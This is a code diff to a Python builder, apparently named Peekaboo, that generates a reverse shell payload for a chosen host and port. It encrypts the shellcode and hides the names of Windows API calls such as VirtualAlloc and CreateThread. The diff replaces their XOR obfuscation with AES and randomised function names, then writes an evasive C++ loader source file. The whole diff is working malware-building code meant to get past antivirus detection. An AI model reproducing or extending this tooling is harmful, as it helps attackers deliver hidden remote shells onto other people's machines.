@@ -6,6 +6,8 @@ import random
 import os
 import hashlib
 import string
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
 
 class Colors:
     HEADER = '\033[95m'
@@ -20,13 +22,17 @@ class Colors:
 
 class PeekabooEncryptor():
     def __init__(self):
+        #self.PAYLOAD_KEY = self.random_bytes()
         self.PAYLOAD_KEY = self.random()
 
     def payload_key(self):
         return self.PAYLOAD_KEY
 
     def func_key(self):
-        return self.random()
+        return self.random_bytes()
+
+    def aes_key(self):
+        return self.random_bytes()
 
     def xor(self, data, key):
         key = str(key)
@@ -46,9 +52,38 @@ class PeekabooEncryptor():
         ciphertext = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };'
         return ciphertext, key
 
+    def pad(self, s):
+        return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)
+
+    def convert(self, data):
+        output_str = ""
+        for i in range(len(data)):
+            current = data[i]
+            ordd = lambda x: x if isinstance(x, int) else ord(x)
+            output_str += hex(ordd(current))
+        return output_str.split("0x")
+
+    # AES encryption
+    # key is randomized (16 bytes random string),
+    # and the key is then transform into the SHA256 hash and
+    # then it is used as a key for encrypting plaintext
+    def aes_encrypt(self, plaintext, key):
+        k = hashlib.sha256(key).digest()
+        iv = 16 * '\x00'
+        plaintext = self.pad(plaintext)
+        cipher = AES.new(k, AES.MODE_CBC, iv.encode("UTF-8"))
+        ciphertext = cipher.encrypt(plaintext.encode("UTF-8"))
+        ciphertext, key = self.convert(ciphertext), self.convert(key)
+        ciphertext = '{' + (' 0x'.join(x + "," for x in ciphertext)).strip(",") + ' };'
+        key = '{' + (' 0x'.join(x + "," for x in key)).strip(",") + ' };'
+        return ciphertext, key
+
     def random(self):
         length = random.randint(16, 32)
         return ''.join(random.choice(string.ascii_letters) for i in range(length))
+
+    def random_bytes(self):
+        return get_random_bytes(16)
 
 def generate_payload(host, port):
     print (Colors.BLUE + "generate reverse shell payload..." + Colors.ENDC)
@@ -82,6 +117,7 @@ def run_peekaboo(host, port):
     encryptor = PeekabooEncryptor()
     print (Colors.BLUE + "read payload..." + Colors.ENDC)
     plaintext = open("/tmp/hack.bin", "rb").read()
+    # plaintext = open("./meow.bin", "rb").read()
 
     f_va = "VirtualAlloc"
     f_vp = "VirtualProtect"
@@ -90,15 +126,16 @@ def run_peekaboo(host, port):
     f_rmm = "RtlMoveMemory"
     f_rce = "RunRCE"
     f_xor = "XOR"
-
+    f_aes = "AESDecrypt"  
+    
     print (Colors.BLUE + "encrypt..." + Colors.ENDC)
-    f_rce, f_xor = encryptor.random(), encryptor.random()
+    f_rce, f_xor, f_aes = encryptor.random(), encryptor.random(), encryptor.random()
     ciphertext, p_key = encryptor.xor_encrypt(plaintext, encryptor.payload_key())
-    ciphertext_va, va_key = encryptor.xor_encrypt(f_va, encryptor.func_key())
-    ciphertext_vp, vp_key = encryptor.xor_encrypt(f_vp, encryptor.func_key())
-    ciphertext_cth, ct_key = encryptor.xor_encrypt(f_cth, encryptor.func_key())
-    ciphertext_wfso, wfso_key = encryptor.xor_encrypt(f_wfso, encryptor.func_key())
-    ciphertext_rmm, rmm_key = encryptor.xor_encrypt(f_rmm, encryptor.func_key())
+    ciphertext_va, va_key = encryptor.aes_encrypt(f_va, encryptor.aes_key())
+    ciphertext_vp, vp_key = encryptor.aes_encrypt(f_vp, encryptor.aes_key())
+    ciphertext_cth, ct_key = encryptor.aes_encrypt(f_cth, encryptor.aes_key())
+    ciphertext_wfso, wfso_key = encryptor.aes_encrypt(f_wfso, encryptor.aes_key())
+    ciphertext_rmm, rmm_key = encryptor.aes_encrypt(f_rmm, encryptor.aes_key())
 
     tmp = open("peekaboo.cpp", "rt")
     data = tmp.read()
@@ -112,14 +149,15 @@ def run_peekaboo(host, port):
 
     data = data.replace('char my_payload_key[] = "";', 'char my_payload_key[] = "' + p_key + '";')
 
-    data = data.replace('char s_va_key[] = "";', 'char s_va_key[] = "' + va_key + '";')
-    data = data.replace('char s_vp_key[] = "";', 'char s_vp_key[] = "' + vp_key + '";')
-    data = data.replace('char s_ct_key[] = "";', 'char s_ct_key[] = "' + ct_key + '";')
-    data = data.replace('char s_wfso_key[] = "";', 'char s_wfso_key[] = "' + wfso_key + '";')
-    data = data.replace('char s_rmm_key[] = "";', 'char s_rmm_key[] = "' + rmm_key + '";')
+    data = data.replace('char s_va_key[] = "";', 'char s_va_key[] = ' + va_key)
+    data = data.replace('char s_vp_key[] = "";', 'char s_vp_key[] = ' + vp_key)
+    data = data.replace('char s_ct_key[] = "";', 'char s_ct_key[] = ' + ct_key)
+    data = data.replace('char s_wfso_key[] = "";', 'char s_wfso_key[] = ' + wfso_key)
+    data = data.replace('char s_rmm_key[] = "";', 'char s_rmm_key[] = ' + rmm_key)
 
-    data = data.replace('RunRCE', f_rce)
-    data = data.replace('XOR', f_xor)
+    data = data.replace('RunRCE(', f_rce + '(')
+    data = data.replace('XOR(', f_xor + '(')
+    data = data.replace('AESDecrypt(', f_aes + '(')
 
     tmp.close()
     tmp = open("peekaboo-enc.cpp", "w+")
